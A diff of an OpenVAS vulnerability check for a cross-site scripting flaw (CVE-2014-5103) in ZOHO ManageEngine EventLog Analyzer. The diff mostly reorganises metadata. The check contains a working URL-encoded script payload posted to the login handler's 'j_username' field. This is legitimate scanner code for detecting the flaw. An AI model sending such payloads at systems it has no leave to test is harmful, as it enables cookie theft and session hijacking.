@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_zoho_manageengine_analyzer_xss_vuln.nasl 6769 2017-07-20 09:56:33Z teissa $
+# $Id: gb_zoho_manageengine_analyzer_xss_vuln.nasl 9982 2018-05-28 12:00:03Z cfischer $
 #
 # ZOHO ManageEngine EventLog Analyzer 'j_username' Parameter XSS Vulnerability
 #
@@ -27,49 +27,30 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804815");
-  script_version("$Revision: 6769 $");
+  script_version("$Revision: 9982 $");
   script_cve_id("CVE-2014-5103");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-20 11:56:33 +0200 (Thu, 20 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-05-28 14:00:03 +0200 (Mon, 28 May 2018) $");
   script_tag(name:"creation_date", value:"2014-08-19 14:57:37 +0530 (Tue, 19 Aug 2014)");
   script_name("ZOHO ManageEngine EventLog Analyzer 'j_username' Parameter XSS Vulnerability");
 
-  tag_summary =
-"This host is installed with ZOHO ManageEngine EventLog Analyzer and is prone
-to cross site scripting vulnerability.";
-
-  tag_vuldetect =
-"Send a crafted data via HTTP GET request and check whether it is able to read
-cookie or not.";
-
-  tag_insight =
-"Input passed via the 'j_username' POST parameter to event/j_security_check
-script is not properly sanitised before returning to the user.";
-
-  tag_impact =
-"Successful exploitation will allow attacker to execute arbitrary HTML and
+  script_tag(name : "summary" , value : "This host is installed with ZOHO ManageEngine EventLog Analyzer and is prone
+to cross site scripting vulnerability.");
+  script_tag(name : "vuldetect" , value : "Send a crafted data via HTTP GET request and check whether it is able to read
+cookie or not.");
+  script_tag(name : "insight" , value : "Input passed via the 'j_username' POST parameter to event/j_security_check
+script is not properly sanitised before returning to the user.");
+  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to execute arbitrary HTML and
 script code in a user's browser session in the context of an affected site.
 
-Impact Level: Application";
-
-  tag_affected =
-"ZOHO ManageEngine EventLog Analyzer version 9.0 build 9000 and probably
-other versions.";
-
-  tag_solution =
-"No solution or patch was made available for at least one year
-since disclosure of this vulnerability. Likely none will be provided anymore.
+Impact Level: Application");
+  script_tag(name : "affected" , value : "ZOHO ManageEngine EventLog Analyzer version 9.0 build 9000 and probably
+other versions.");
+  script_tag(name : "solution" , value : "No known solution was made available for at least one year
+since the disclosure of this vulnerability. Likely none will be provided anymore.
 General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.";
-
-
-  script_tag(name : "summary" , value : tag_summary);
-  script_tag(name : "vuldetect" , value : tag_vuldetect);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "solution" , value : tag_solution);
+features, remove the product or replace the product by another one.");
   script_tag(name:"solution_type", value:"WillNotFix");
 
   script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/94815");
@@ -80,50 +61,35 @@ features, remove the product or replace the product by another one.";
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 8400);
+  script_exclude_keys("Settings/disable_cgi_scanning");
+
   exit(0);
 }
-
 
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-zohoPort = "";
-req = "";
-res = "";
-url = "";
-
-## Get HTTP Port
 zohoPort = get_http_port(default:8400);
-if(!zohoPort){
-  zohoPort = 8400;
-}
-
-## Check the port status
-if(!get_port_state(zohoPort)){
-  exit(0);
-}
 
 url = "/event/index3.do" ;
 
 req = http_get(item: url, port:zohoPort);
 res = http_keepalive_send_recv(port:zohoPort, data:req);
 
-##Confirm Application
 if(res && ">ZOHO Corp.<" >< res && ">ManageEngine EventLog Analyzer" >< res)
 {
-  ## Construct the attack request
   postData = "forChecking=&j_username=%22%3E%3Cscript%3Ealert%28document.coo" +
              "kie%29%3B%3C%2Fscript%3E&j_password=12&domains=&loginButton=Lo" +
              "gin&optionValue=hide";
 
   url = "/event/j_security_check";
 
-  ##Construct the request string
+  host = http_host_name(port:zohoPort);
+
   req = string("POST ", url, " HTTP/1.1\r\n",
-             "Host: ", get_host_name(), "\r\n",
+             "Host: ", host, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(postData), "\r\n",
              "\r\n", postData);
